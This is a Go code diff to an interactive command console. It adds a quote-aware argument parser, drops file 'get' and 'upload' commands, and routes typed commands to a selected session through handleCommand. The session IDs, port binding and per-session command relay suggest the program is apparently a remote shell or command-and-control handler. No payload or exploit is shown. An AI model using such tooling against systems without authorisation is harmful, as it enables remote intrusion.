@@ -10,7 +10,11 @@ import (
 
 func executor(input string) {
 	input = strings.TrimSpace(input)
-	inp := strings.Split(input, " ")
+	inp := parseCommand(input)
+
+	if len(inp) == 0 {
+		return
+	}
 
 	switch inp[0] {
 	case "":
@@ -32,10 +36,6 @@ func executor(input string) {
 				log.Println("Unable to set:", err)
 			}
 		}
-	case "get":
-		if err := getFile(inp, CId); err != nil {
-			log.Println("Unable to get the image:", err)
-		}
 	case "bind":
 		go bindPort(inp[1:])
 	case "send":
@@ -45,24 +45,13 @@ func executor(input string) {
 
 	case "import":
 		importScript(inp[1])
-	case "upload":
-		if CId == "" {
-			fmt.Println("You must specify a session ID before attempting to send a command.")
-			return
-		}
-		upload(inp, CId)
 	default:
 		if CId == "" {
 			fmt.Println("You must specify a session ID before attempting to send a command.")
 			return
 		}
 
-		chs[CId] <- input
-		if output, open := <-chs[CId]; !open {
-			fmt.Print("The channel is closed.\n")
-		} else {
-			fmt.Println(output)
-		}
+		handleCommand(CId, input)
 	}
 
 }
@@ -244,6 +233,33 @@ func completer(d prompt.Document) []prompt.Suggest {
 		}
 	}
 	return []prompt.Suggest{}
+}
+
+func parseCommand(cmd string) []string {
+	var args []string
+	var current strings.Builder
+	inQuote := false
+	
+	for i := 0; i < len(cmd); i++ {
+		c := cmd[i]
+		
+		if c == '"' {
+			inQuote = !inQuote
+		} else if c == ' ' && !inQuote {
+			if current.Len() > 0 {
+				args = append(args, current.String())
+				current.Reset()
+			}
+		} else {
+			current.WriteByte(c)
+		}
+	}
+	
+	if current.Len() > 0 {
+		args = append(args, current.String())
+	}
+	
+	return args
 }
 
 func inputParser() {
